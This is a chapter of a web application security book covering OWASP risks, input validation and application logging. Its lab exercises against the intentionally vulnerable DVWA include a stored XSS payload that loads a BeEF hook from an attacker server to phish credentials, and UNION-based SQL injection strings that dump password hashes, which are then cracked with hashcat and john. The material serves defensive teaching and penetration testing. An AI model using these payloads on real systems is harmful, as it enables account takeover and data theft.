# Web Applications {#web-applications}

![10,000' view of Web Application Security](images/10000WebApp.gif)





## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:

{#web-applications-asset-identification-ownership}
* Ownership. Similarly as addressed in the VPS chapter, Do not assume that ownership, or at least control of your server(s) is something you will always have. Ownership is often one of the first assets an attacker will attempt to take from a target in order to execute further exploits. At first this may sound strange, but that is because of an assumption you may have that you will always own (have control of) your web application. Hopefully I dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets of greater value. The web application itself will often just be a stepping stone to other assets that you assume are safe. With this in mind, your web application is an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect your web application and in many cases take it to school and teach it how to protect itself. I cover that under the [Web Application Firewall](#web-applications-countermeasures-lack-of-active-automated-prevention-waf) section, where AppSensor can help.
* Similarly to the [Asset Identification](#vps-asset-identification) section in the VPS chapter, Visibility is an asset that is up for grabs
* Intellectual property or sensitive information within the code or configuration files such as email addresses and account credentials for the likes of data-stores, syslog servers, monitoring services. We address this in [Management of Application Secrets](#web-applications-identify-risks-management-of-application-secrets)
* Sensitive Client/Customer data.
* Sanity and piece of mind of people within your organisation. Those that are:
  * Well informed
  * Do not cut corners that should not be cut
  * Passionate and driven to be their best
  * Smart
  * Humble yet fearless
  * Recognise technical debt and are professional enough to speak up
  * Engaged and love passing on their knowledge to others are truly an asset.  
  Some of the following risks will threaten the sanity of these people if the countermeasures are not employed.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#identify-risks), but for Web Application.

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)
* _Todo_ Exploit WebRTC
  * [Part 1](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with.html)
  * [Part 2](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with_26.html)

This slide was from a talk I did at OWASP NZ Day 2013. The top 10 vulnerabilities do not change a lot

&nbsp;

![](images/2013OWASPTop10.jpg)

&nbsp;

They were actually very similar 10 years ago.
   
The vulnerabilities that have not changed a lot are:

* No. 1 Injection (and the easiest to fix)
* No. 2 Broken Authentication and Session Management
* No. 3 XSS
* No. 4 Insecure Direct Object References
* No. 5 Security Misconfiguration
* No. 8 Frameworks are helping with CSRF
* No. 9 is new, because we are now consuming a lot more packages without vetting them.

&nbsp;

![](images/OWASPTop10SomeThingsDontChange.jpg)

{pagebreak}

### Lack of Visibility

I see this as an indirect risk to the asset of [web application ownership](#web-applications-asset-identification-ownership). The same sections in the VPS and Network chapters may also be worth reading if you have not already as there is crossover.

Not being able to introspect your application at any given time or being able to know how the health status is, is not a comfortable place to be in and there is no reason you should be there.

#### Insufficient Logging and Monitoring

![](images/ThreatTags/average-widespread-veryeasy-moderate.png)

Can you tell at any point in time if someone or something is:

* Using your application in a way that it was not intended to be used
* Violating policy. For example circumventing client side input sanitisation.

How easy is it for you to notice:

* Poor performance and potential DoS?
* Abnormal application behaviour or unexpected logic threads
* Logic edge cases and blind spots that stake holders, Product Owners and Developers have missed?
* Any statistics that may be helpful in diagnosing any application specific issue

### Lack of Input Validation, Filtering and Sanitisation {#web-applications-identify-risks-lack-of-input-validation-and-sanitisation}
![](images/ThreatTags/easy-common-average-severe.png)

#### Generic

The risks here are around accepting untrusted data and parsing it, rendering it, executing it or storing it verbatim to have the same performed on it at a later stage. 

Untrusted territory is usually a location that is not close to your back-end executing code. If your back-end is in the cloud that you do not control, I.E. not your hardware, not your staff running it, then you have serious potential issues there as well that you may want to address. I've discussed in depth what these issues are in the previous chapters and how to mitigate the risks. Anywhere outside of your local network is untrusted. Inside your local network is semi-trusted. The amount of trust you afford depends on the relationships you have with your staff, how large your staff base is, how large your network is, how APs are managed and many of the other issues I have discussed in the previous chapters, especially Physical, IoT, Mobile, People and Network. The closer data gets to the executing back-end code, the less untrustworthy the territory should be. Of course there are many exceptions to this rule as well.

So I could say, just do not trust anyone or anything, but there comes a time and a place that you have to afford trust. Just keep it as close to the back-end executing code as possible.

If you parse, render or execute data that you can not trust, that is data accepted by an unknown user, whether it be through a browser, intercepting communications somewhere along untrusted territory.

Below are a few techniques widely accepted that we need to use on any untrusted data before it makes its travels through your system to be stored or hydrated.

##### What is Validation {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation}

&nbsp;

Decide what input is valid by way of a white list (list of input characters that are allowed to be received). Often each input field will have a different white list. Validation is binary, the data is either allowed to be received or not allowed. If it is not allowed, then it is rejected. This is usually not to complicated to work out what is good, what is not and thus rejected. There are a few strategies to use for white listing, such as the actual collection of characters or using regular expressions.

There are other criteria that you can validate against as well, such as:

* Field lengths
* Whether or not something is required
* Whether or not something is a specific type or in a specific format and many other criteria

{title="Validation", linenos=off, lang=JavaScript}
    // The NodeJS module express-form provides validation, filtering
    // and some light weight sanitisation as Express middleware.
    var form = require('express-form');
    var fieldToValidate = form.field;

    // trim is filtering.
    fieldToValidate('name').trim().
    // required is validation.
    required().
    // minLength is validation.
    minLength(2).
    // maxLength is validation.
    maxLength(50).
    // is is validation.
    is(/^[a-zA-Z ']+$/)
    // There is no sanitisation here.

##### What is Filtering

&nbsp;

When some data can pass through (be received) and some is captured by the filter element (thou shalt not pass). OWASP has the RSnake donated seminal [XSS cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which has many tests you can use to check your vulnerability stance to XSS exploitation. This is highly recommended.

##### What is Sanitisation

&nbsp;

Sanitisation of input data is where the input data whether it is in your white list or not is accepted and transformed into a medium that is no longer dangerous. Now it will probably go through validation first. The reason you sanitise character signatures (may be more than single characters, character combinations) not in your white list is a defence in depth strategy. The white list may change in the future due to a change in business requirements and the developer may forget to revise the sanitisation routines. Always think of any security measure as standing on its own when you create it, but standing alongside many other security measures once done.

You need to know which contexts your input data will pass through in order to sanitise correctly for all potential execution contexts. This requires lateral thinking and following all execution paths. Both into and out of your application (once rehydrated), being pushed back to the client. We cover this in depth below in the ["Example in JavaScript and C#"](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp) section in the countermeasures.

#### Buffer Overflows {#web-applications-identify-risks-buffer-overflows}

_Todo_
<!--- https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008 -->

#### Cross-Site Scripting (XSS) {#web-applications-identify-risks-cross-site-scripting}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

The following hands on hack demonstrates what a XSS attack is and provides a little insight into some of the damages that it can cause.

A XSS attack is one in which untrusted data enters a web application usually through a web request and is not stopped by validation, filtering or sanitisation. The data is then at some point sent to someone using the same web application without being validated, filtered or sanitised.  
The data in question is executed by the browser, usually JavaScript, HTML or Flash. What the code does is up to the creativity of the initiator.

The main two different types of XSS are Stored/Persistent or Type I and Reflected/Non-Persistent or Type II.  
Stored attacks are where the injected code is sent to the server and stored in a medium that the web application uses to retrieve it again to send to another user.  
Reflected attacks use the web application in question as a proxy. When a user makes a request, the injected code travels from another medium through the web application (hence the reflecting) and to the end user. From the browsers perspective, the injected code came form the web application that the user made a request to.

{#wdcnz-demo-1}
![](images/HandsOnHack.png)

The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in the People chapter under [Spear Phishing](#people-identify-risks-spear-phishing).

Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it is likely you would have been through the following:

1. Information gathering (probably partly even before you signed the contract with your client)
2. Vulnerability scanning
3. Vulnerability searching

If you are working within a development team you may have found out some other way that your project was vulnerable to XSS.

How ever you got to this point, you are going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
One of BeEFs primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 5 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEFs attributes. 

You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).

I> ## Synopsis
I>
I> In this exercise, I have used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.

{icon=bomb}
G> ## The Play
G>
G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you have configured TLS) with the user and password that you set-up in the BeEF root config.yaml.
G>
G> Open another browser tab and log-in to the DVWA.
G>
G> Browse to "XSS stored".
G>
G> Enter some text in the Name field and some text in the Message field.
G> 
G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on.
G>
G> Fire up burp.
G>
G> Back in the DVWA send your request by clicking on the Sign Guest-book button.
G>
G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
G>
G> You can disable FoxyProxy now too.
G>
G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
G>
G> If you open the victims browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
G>
G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
G>
G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you have done due diligence in the reconnaissance stage.
G>
G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  

#### Cross-Site Request Forgery (CSRF)

_Todo_

%% Take details from:

* http://www.asp.net/mvc/overview/security/xsrfcsrf-prevention-in-aspnet-mvc-and-web-pages
* https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern

The first link describes things the best.  
"Anatomy of an attack"  
"Generating the tokens"  
The specific server side web application is responsible for generating the unique tokens and adding them to the responses.  
The application in the browser, or browser, or users device, is responsible for storing the one-time token, then issuing it with each request where CSRF is a concern.  

Each technology will do things differently.

#### SQLi {#web-applications-identify-risks-sqli}

![](images/HandsOnHack.png)

 One of the simplest and quickest vulnerabilities to fix is SQL Injection, yet it is still top of the hit lists. I am going to hammer this home some more.

I> ## Synopsis
I>
I> I have used the Dam Vulnerable Web Application (DVWA) from the OWASP Broken Web Applications [VM](http://sourceforge.net/projects/owaspbwa/files/) for this exercise. You can load this VM in a VMware product or add the virtual machine disk to a new VM in VirtualBox. It's an Ubuntu 64 bit image. Once you have your VM ready to boot, use the Host-only Adapter so it's sand-boxed from the rest of your network. You really would not want an attacker gaining access to this VM as it is purposely vulnerable and attacks could easily be launched from it.
I>
I> Start the machine.

{icon=bomb}
G> ## The Play
G>
G> In your Kali Linux box, run owasp-zap.  
G> If chromium is not already running, run it and setup foxyproxy for chrome using the burp proxy we set-up in the [Tooling Setup](#tooling-setup-kali-linux-tools-i-use-that-need-adding-to-kali-linux-chromium-extensions-foxyproxy-standard) chapter. Zap is now recording your browsing.
G>
G> Once you have started the VM and browsed to it, select the DVWA and log in as  
G> user: "user", password "user". Make sure the Security Level is set to low.
G>
G> Navigate to the SQL Injecton page and enter `1` in the input box.
G>
G> In Zap: Right click on dvwa -> Attack -> Active Scan -> Start Scan
G>
G> When the scan has finished: go to the Alerts tab -> Select SQL Injection -> look at the request and response.  
G> See Zap used a union query, but response said "The used SELECT statements have a different number of columns". Which means if we use the correct number of columns we will have success.  
G>
G> In Request tab, select input parameter -> right click and select Fuzz -> Payloads -> Add -> Select File Fuzzers from "Type" dropdown. jbrofuzz->SQL Injection->SQL Injection -> Add -> OK -> Start Fuzzer
G>
G> Notice the `x' OR full_name LIKE '%bob%` in the Fuzzer tab?
G>
G> Then try the following in dvwa input:
G>
G> `x' OR full_name LIKE '%bob%`  
G> Output: Tells us we are in a where clause and I had an unknown column name.  
G> Thanks MySQL error reporting!
G>
G> Try the following queries:  
G> `x' OR first_name LIKE '%bob%`     # This works  
G> `x' OR last_name LIKE '%smith%`    # This works  
G> `x' OR first_name LIKE '%`         # And as expected, we get what we think are all users.
G>
G> Also the recon stage may tell us a lot about naming conventions and more. Once you know who the employees are:  
G> Search stackoverflow, github, etc for tidbits. Also [gitrob](https://github.com/michenriksen/gitrob)  
G> As we try different things, we learn more about naming conventions.  
G> You may also be able to find out about the target organisations naming conventions by looking around the internet. Github, Bitbucket, Stackoverflow and many other sites usually yield useful information.
G>
G> `x' OR user LIKE '%`               # This works  

{icon=bomb}
G>
G> I thought the query on the server looked something like this:  
G> `SELECT ID, first_name, last_name FROM users WHERE ID = ''`
G>
G> Time to work out what the table name is.
G>
G> Lets try users. I'm thinking that the full query will look like:  
G> `SELECT ID, first_name, last_name FROM users WHERE ID = '1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%`  
G> Output: Unknown column 'ID'  
G> Lets fix that:  
G> `1' UNION SELECT user_id, first_name, last_name FROM users WHERE first_name LIKE '%`  
G> Output: "The used SELECT statements have a different number of columns"  
G> This told me that the query on the server was slightly different to what I thought. My revised guess of the full query:  
G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%`
G>
G> Now for the passwords:  
G> Full server query guess:  
G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%`
G>
G> Lets determine the hash type with hash-identifier. Just run it and throw the hash at it and it will tell you that it is most likely a simple MD5. which is a one-way hashing function with no Key derivation. So very quick to crack.
G>
G> So take your pick of the following three commands:  
G> Create `~/hashtocrack.txt` and put the hash(s) you want cracked in it. Now usually you would create a profiled wordlist taylored to your target like we did in the [Password Profiling](#people-identify-risks-weak-password-strategies-password-profiling) section in the People chapter. For this exercise just add the following three words to `~/wordlist-to-throw-at-dvwa`:  
G> `dogs`, `cats`, `admins`, `admin`. Now you can compare the hashed words from the list with the hash in the `~/hashtocrack.txt`  
G> 1. `hashcat -m 0 ~/hashtocrack.txt ~/wordlist-to-throw-at-dvwa`  
G>    `-m 0` means MD5 to hashcat.  
G> 2. `[algorithm]` for next command in this case will be `MD5`  
G>    `findmyhash [algorithm] -h <hash_value>`  
G>    `findmyhash` is a cracker that queries online lists.  
G> 3. `john --format=raw-MD5 ~/hashtocrack.txt ~/wordlist-to-throw-at-dvwa --show`  
G> This gives us the super secure password of "admin"

{icon=bomb}
G>
G> In order to get login, we actually need the username. In this case they were the same, but for some other users they were not. So our last query.  
G> Full server query guess:  
G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT user, password FROM users WHERE first_name LIKE '%`  
G> Or simplified:  
G> `1' UNION SELECT user, password FROM users#'`
G> Now we have our admin password and user.

There are two main problems here.

1. SQL Injection
2. Poor decisions around sensitive data protection. We discuss this in depth further on in this chapter in the [Data-store Compromise](#web-applications-identify-risks-management-of-application-secrets-data-store-compromise) section and even more so the [Countermeasures](#web-applications-countermeasures-data-store-compromise) of. Do not follow this example of a lack of well salted and quality strong key derivation functions (KDFs) used on all of the sensitive data in your own projects.

#### Command Injection {#web-applications-identify-risks-command-injection}

![](images/HandsOnHack.png)

_Todo_

%% NodeJS https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js

#### LDAP Injection {#web-applications-identify-risks-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-identify-risks-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-identify-risks-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-identify-risks-xslt-injection}

_Todo_

#### XML Injection {#web-applications-identify-risks-xml-injection}

_Todo_

#### Captcha
![](images/ThreatTags/easy-verywidespread-easy-low.png)

Lack of captchas are a risk, but so are captchas themselves...

What is the problem here? What are we trying to stop?

Bots submitting. What ever it is, whether advertising, creating an unfair advantage over real humans, link creation in attempt to increase SEO, malicious code insertion, you are more than likely not interested in accepting it.

What do we not want to block?

People submitting genuinely innocent input. If a person is prepared to fill out a form manually, even if it is spam, then a person can view the submission and very quickly delete the validated, filtered and possibly sanitised message.

### Management of Application Secrets {#web-applications-identify-risks-management-of-application-secrets}

* Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc, and may even provide credentials to continue moving through the network compromising other machines.
* Passwords and/or their hashes travelling over the network. Also see the [Wire Inspecting](#network-identify-risks-wire-inspecting) section in the [Network](#network) chapter.

#### Data-store Compromise {#web-applications-identify-risks-management-of-application-secrets-data-store-compromise}
![](images/ThreatTags/difficult-widespread-average-moderate.png)

The reason I've tagged this as moderate is because if you take the countermeasures, it doesn't have to be a disaster.

The New Zealand Intelligence Service recently [told](http://www.stuff.co.nz/national/politics/73704551/homegrown-threats-more-serious-says-spy-boss-rebecca-kitteridge) Prime Minister John Key that this was one of the 6 top threats facing New Zealand. "_Cyber attack or loss of information and data, which poses financial and reputational risks._"

There are many examples of data-store compromise happening on a daily basis. If organisations took the advice I outline in the countermeasures section the millions of users would not have their identifies stolen. Sadly the advice is rarely followed. The Ashley Madison debacle is a good example. Ashley Madisons entire business relied on its commitment to keep its clients (37 million of them) data secret, provide discretion and anonymity. 

"_Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage_"

"_We worked hard to make a fully undetectable attack, then got in and found nothing to bypass.... Nobody was watching. No security. Only thing was segmented network. You could use Pass1234 from the internet to VPN to root on all servers._”

"_Any CEO who isn’t vigilantly protecting his or her company’s assets with systems designed to track user behavior and identify malicious activity is acting negligently and putting the entire organization at risk. And as we’ve seen in the case of Ashley Madison, leadership all the way up to the CEO may very well be forced out when security isn’t prioritized as a core tenet of an organization._"

> Dark Reading

Other notable data-store compromises were [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) with 145 million active buyers. Many others coming to light regularly. 

Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected.

%% http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/How-Cracked-Windows-Password-Part2.html

#### Caching of Sensitive Data {#web-applications-identify-risks-management-of-application-secrets-caching-of-sensitive-data}
![](images/ThreatTags/easy-common-difficult-moderate.png)

_Todo_



#### Physical Access

_Todo_

#### Console Access

_Todo_

#### Network Access

_Todo_

#### Cracking {#web-applications-identify-risks-management-of-application-secrets-cracking}

_Todo_

Remember we covered Password Profiling in the People chapter where we essentially made good guesses around the end users passwords. Here we already have the password hashes. We just need to find the source passwords that created the hashes.

When an attacker acquires a data-store or domain controller dump of hashed passwords, they need to crack the hashes in order to get the passwords. How this works is the attacker will find or create a suitable password list of possible passwords. The tool used will attempt to create a hash of each of these words based on the hashing algorithm used on the dump of hashes. Then compare each dumped hash with the hashes just created. When a match is found, we know that the word in our wordlist used to create the hash that matches the dumped hash is in fact a legitimate password.

A smaller wordlist is going to take less time to create the hashes. As this is often an off-line attack, a larger wordlist is often preferred over a smaller one because the number of generated hashes will be greater, which when compared to the dump of hashes means the likelihood of a greater number of matches is increased.

As part of the hands on hack in the [SQLi](#web-applications-identify-risks-sqli) section, we obtained the password hashes via SQL injection from the target web application DVWA (part of the OWASP Broken Web Application suite (VM)). We witnessed how an attacker could obtain the passwords from the hashed values retrieved from the database.


%% See section in TheHackerPlaybook2 on Password Cracking
oclHashcat  
John the Ripper (JtR)  
Cain and Abel (windows)

%% http://www.troyhunt.com/2011/06/owasp-top-10-for-net-developers-part-7.html "Anatomy of an insecure cryptographic storage attack" onwards
%% http://www.troyhunt.com/2012/06/our-password-hashing-has-no-clothes.html

_Todo_


%% Resources:

%% * DVWA? toastmasters example?
%% * TheHackerPlaybook2 - Special Teams - Password Cracking
%% * Owning the web presentation near the end
%% * http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/How-Cracked-Windows-Password-Part2.html
%% * John the Ripper vs Hashcat vs Ophcrack vs Findmyhash and Chntpw http://www.thesecurityblogger.com/how-hackers-crack-weak-passwords/
%% * Hashcat http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/





















### Lack of Authentication, Authorisation and Session Management {#web-applications-identify-risks-lack-of-authentication-authorisation-session-management}

Also brought to light by the OWASP Top 10 risks "[_No. 2 Broken Authentication and Session Management_](https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management)".

With this category of attacks, your attacker could be either someone you do or do not know. Possibly someone already with an account, an insider maybe, looking to take the next step which could be privilege escalation or even just alteration so that they have access to different resources by way of acquiring other accounts. Some possible attack vectors could be:

* Password acquisition: by way of data-store theft (off-line attack) or poor password hashing strategies (susceptible to off-line and on-line attacks), discussed in the Countermeasures section but in more depth in the Management of Application Secrets sections
* Passwords or sessionIds travelling over unsecured channels susceptible to Man In the Middle (MItM) attacks, discussed in the Countermeasures section but also refer to the TLS Downgrade sections of the Network chapter
* Buggy Session Management, SessionIds exposed in URLs
* Faulty logout (not invalidating authentication tokens)
* Faulty remember me functionality
* Long session time-outs can exacerbate other weak areas of defence
* Secret questions
* Updating account details

In the Countermeasures section I go through some mature and well tested libraries and other technologies, and details around making them fit into a specific business architecture.

Consider what data could be exposed from any of the accounts and how this could be used to gain a foot hold to launch further alternative attacks. Each step allowing the attacker to move closer to their ultimate target, the ultimate target being something hopefully discussed during the Asset Identification phase or taking another iteration of it as you learn and think of additional possible targeted assets.

Often the line between the following two concepts gets blurred, sometimes because where one starts and one ends is often not absolute or clear, and sometimes intentionally. Neither help new comers and even those used to working with the concepts get to grips with which is which and what the responsibilities of each include.

#### What is Authentication

The process of determining whether an entity (be it person or something else) is who or what it claims to be.

Being authenticated, means the entity is known to be who or what it/he/she claims to be.

#### What is Authorisation

The process of verifying that an entity (usually requesting)(be it person or something else) has the right to a resource or to carry out an action, then granting permission requested.

Being authorised, means the entity has the power or right to certain privileges.

&nbsp;

**Don't build your own** authentication, authorisation or session management system unless it's your core business. It's too easy to get things wrong and you only need one defect in order to be compromised. Leave it to those that have already done it or do it as part of their core business and have already worked through the defects.

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-identify-risks-cryptography-on-the-client}

* Untrusted Crypto (Web Crypto API). Is this really a good idea? _Todo_
  * [https://www.hackinparis.com/node/309](https://www.hackinparis.com/node/309)
  * [http://tonyarcieri.com/whats-wrong-with-webcrypto](http://tonyarcieri.com/whats-wrong-with-webcrypto)

### Consuming Free and Open Source {#web-applications-identify-risks-consuming-free-and-open-source}
![](images/ThreatTags/average-widespread-difficult-moderate.png)

This is where [A9 (Using Components with Known Vulnerabilities)](https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities) of the 2013 OWASP Top 10 comes in.

We are consuming far more free and open source libraries than we have ever before. Much of the code we are pulling into our projects is never intentionally used, but is still adding surface area for attack. Much of it:

* Is not thoroughly tested (for what it should do and what it should not do). We are often relying on developers we do not know a lot about to have not introduced defects. As I discussed in the [Code Review](#process-agile-development-and-practices-code-review-why) section, most developers are more focused on building than breaking, they do not even see the defects they are introducing.
* Is not reviewed evaluated. That is right, many of the packages we are consuming are created by solo developers with a single focus of creating and little to no focus of how their creations can be exploited. Even some teams with a security champion are not doing a lot better.
* Is created by amateurs that could and do include vulnerabilities. Anyone can write code and publish to an open source repository. Much of this code ends up in our package management repositories which we consume.
* Does not undergo the same requirement analysis, defining the scope, acceptance criteria, test conditions and sign off by a development team and product owner that our commercial software does.

Many vulnerabilities can hide in these external dependencies. It is not just one attack vector any more, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you do not find and deal with them, I can assure you, someone else will.

Running install or any scripts from non local sources without first downloading them and inspecting can destroy or modify your and any other reachable systems, send sensitive information to an attacker, or any number
of other criminal activities.

### Insecure Direct Object References

_Todo_

%% Todo: Spider my website. Document how to. Node Goat also had some good exercises around this.

### Lack of Active Automated Prevention

_Todo_

Your application should be actively defending itself.

## 3. SSM Countermeasures

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)

### Lack of Visibility {#web-applications-countermeasures-lack-of-visibility}

Also refer to the ["Lack of Visibility"](#vps-countermeasures-lack-of-visibility) section in the VPS chapter where I discuss a number of tried and tested solutions.

As Bruce Schneier said: "_Detection works where prevention fails and detection is of no use without response_". This leads us to application logging.

With good visibility we should be able to see anticipated and unanticipated exploitation of vulnerabilities as they occur and also be able to go back and review the events.

#### Insufficient Logging {#web-applications-countermeasures-lack-of-visibility-insufficient-logging}
![](images/ThreatTags/PreventionAVERAGE.png)


When it comes to logging in NodeJS, you can't really go past winston. It has a lot of functionality and what it does not have is either provided by extensions, or you can create your own. It is fully featured, reliable and easy to configure like NLog in the .NET world.

I also looked at `express-winston`, but could not see why it needed to exist.

{title="package.json", linenos=off, lang=JavaScript}
    {
       ...
       "dependencies": {
          ...,
          "config": "^1.15.0",
          "express": "^4.13.3",
          "morgan": "^1.6.1",
          "//": "nodemailer not strictly necessary for this example,",
          "//": "but used later under the node-config section.",
          "nodemailer": "^1.4.0",
          "//": "What we use for logging.",
          "winston": "^1.0.1",          
          "winston-email": "0.0.10",
          "winston-syslog-posix": "^0.1.5",
          ...
       }
    }

[`winston-email`](https://www.npmjs.com/package/winston-email) also depends on [`nodemailer`](https://www.npmjs.com/package/nodemailer).

##### Opening UDP port

with [`winston-syslog`](https://www.npmjs.com/package/winston-syslog) seems to be what a lot of people are using. I think it may be due to the fact that `winston-syslog` is the first package that works well for winston and syslog.

If going this route, you will need the following in your `/etc/rsyslog.conf`:

{title="/etc/rsyslog.conf", linenos=off, lang=Bash}
    $ModLoad imudp
    # Listen on all network addresses. This is the default.
    $UDPServerAddress 0.0.0.0
    # Listen on localhost.
    $UDPServerAddress 127.0.0.1
    $UDPServerRun 514
    # Or the new style configuration.
    Address <IP>
    Port <port>
    # Logging for your app.
    local0.* /var/log/yourapp.log

I Also looked at `winston-rsyslog2` and `winston-syslogudp`, but they did not measure up for me.

If you do not need to push syslog events to another machine, then it does not make much sense to push through a local network interface when you can use your posix syscalls as they are faster and safer. Line 7 below shows the open port.

{title="nmap with winston-syslog", linenos=on}
    root@kali:~# nmap -p514 -sU -sV <target IP> --reason

    Starting Nmap 6.47 ( http://nmap.org )
    Nmap scan report for kali (<target IP>)
    Host is up, received arp-response (0.0015s latency).
    PORT    STATE         SERVICE REASON      VERSION
    514/udp open|filtered syslog  no-response
    MAC Address: 34:25:C9:96:AC:E0 (My Computer)

##### Using Posix

The [`winston-syslog-posix`](https://www.npmjs.com/package/winston-syslog-posix) package was inspired by [blargh](http://tmont.com/blargh/2013/12/writing-to-the-syslog-with-winston). `winston-syslog-posix` uses [`node-posix`](https://www.npmjs.com/package/posix).

If going this route, you will need the following in your `/etc/rsyslog.conf` instead of the above:

{title="/etc/rsyslog.conf", linenos=off, lang=Bash}    
    # Logging for your app.
    local0.* /var/log/yourapp.log

Now you can see on line 7 below that the syslog port is no longer open:

{title="nmap with winston-syslog-posix", linenos=on}
    root@kali:~# nmap -p514 -sU -sV <target IP> --reason

    Starting Nmap 6.47 ( http://nmap.org )
    Nmap scan report for kali (<target IP>)
    Host is up, received arp-response (0.0014s latency).
    PORT    STATE  SERVICE REASON       VERSION
    514/udp closed syslog  port-unreach
    MAC Address: 34:25:C9:96:AC:E0 (My Computer)

&nbsp;

Logging configuration should not be in the application startup file. It should be in the configuration files. This is discussed further under the ["Store Configuration in Configuration files"](#web-applications-countermeasures-management-of-application-secrets-store-configuration) section.

Notice the syslog transport in the configuration below starting on line 39. 

{title="default.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {      
          colours: {
             debug: 'white',
             info: 'green',            
             notice: 'blue',
             warning: 'yellow',
             error: 'yellow',
             crit: 'red',
             alert: 'red',
             emerg: 'red'
          },
